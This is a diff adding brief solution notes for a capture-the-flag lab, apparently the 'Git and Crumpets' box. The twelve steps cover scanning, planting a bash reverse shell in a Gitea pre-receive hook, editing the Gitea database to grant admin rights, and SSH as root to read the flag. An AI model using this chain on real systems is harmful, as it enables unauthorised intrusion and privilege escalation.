@@ -1,0 +1,12 @@
+1 - nmap -A 10.10.247.14
+2 - curl http://10.10.247.14
+3 - echo "10.10.247.14 git.git-and-crumpets.thm" | tee -a /etc/hosts
+4 - http://git.git-and-crumpets.thm"
+5 - wget avatar
+6 - exiftool avatar
+7 - Git Hooks -> Pre Receive -> bash reverse shell
+8 - find / -name "*gitea*" -type f 2>/dev/null
+9 - sqlite3 /var/lib/gitea/data/gitea.db
+10 - UPDATE user SET is_admin=1 WHERE id=3;
+11 - ssh -i id_rsa root@10.10.247.14
+12 - cat root.txt
